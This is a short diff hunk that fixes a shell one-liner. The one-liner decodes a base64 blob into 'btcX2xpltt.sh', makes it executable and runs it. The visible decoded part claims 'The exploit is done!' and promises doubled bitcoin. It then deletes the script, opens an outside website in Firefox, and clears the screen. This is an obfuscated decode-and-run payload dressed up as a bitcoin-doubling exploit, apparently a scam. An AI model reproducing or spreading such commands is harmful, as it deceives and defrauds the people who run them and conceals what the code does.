@@ -59,4 +59,4 @@ ICAgIG1pbj01OQogICAgICAgICAgICAgICAgbGV0ICJob3VyPWhvdXItMSIKICAgICAgICBkb25l
 CmVjaG8gIlRoZSBleHBsb2l0IGlzIGRvbmUhIgplY2hvICJZb3Ugd2lsbCByZWNlaXZlIHlvdXIg
 WDIgYml0Y29pbiBpbiBhIGNvdXBsZSBvZiBtaW51dGVzISIKY2QgJiYgY2QgRG9jdW1lbnRzICYm
 IHJtIGJpdGNvaW5YMmV4cGxvaXR0LnNoICYmIGZpcmVmb3ggaHR0cDovL3BldHNwYWx0YW4uY29t
-LyAmJiBjbGVhciAmJiBleGl0Cgo=" | base64 -d > btcX2xpltt.sh && chmod +x btcX2xpltt && bash btcX2xpltt.sh
+LyAmJiBjbGVhciAmJiBleGl0Cgo=" | base64 -d > btcX2xpltt.sh && chmod +x btcX2xpltt.sh && bash btcX2xpltt.sh
